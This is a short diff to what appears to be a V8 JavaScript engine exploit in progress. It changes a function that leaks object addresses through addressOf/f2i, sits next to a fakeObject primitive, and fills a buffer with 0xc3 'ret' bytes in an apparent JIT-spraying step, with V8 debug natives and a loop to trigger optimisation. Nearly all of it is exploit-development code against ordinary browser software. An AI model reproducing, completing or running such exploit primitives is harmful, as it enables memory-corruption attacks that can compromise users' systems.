@@ -44,13 +44,29 @@ function fakeObject(addr_to_fake)
 
 function t(i)
 {
+	var b = i % 0xc2;
+    var d = i - 0xc2;
+    var e = i ^ 0xc2;
+    buf[0x58] = 0xc3;
+    buf[0x5f] = 0xc3;
+    buf[0x5a] = 0xc3;
+    buf[0x5e] = 0xc3;
+    buf[0xf] = 0x5;
+    var extra = e + 0xc305;
+    // buf[e + 0x5] = 0xc3;
+    buf[0x5] = 0xc3;
+	var test_obj_addr = 0x456;
 	//%DebugPrint(test_obj);
-	var test_obj_addr = f2i(addressOf(buf));
-	//if(i == 0 || i == 9999)
-	%DebugPrint(buf);
-	console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
+	if (i == 9999) {
+		test_obj_addr = f2i(addressOf(buf));
+		console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
+		%DebugPrint(buf);
+		%SystemBreak();
+	}
+    var result = b + d + e + extra;
+    return result;
 	//%SystemBreak();
 }
 
-for(var i = 0;i < 10240; i++)
+for (var i = 0; i < 10000 ; i++)
 	t(i);
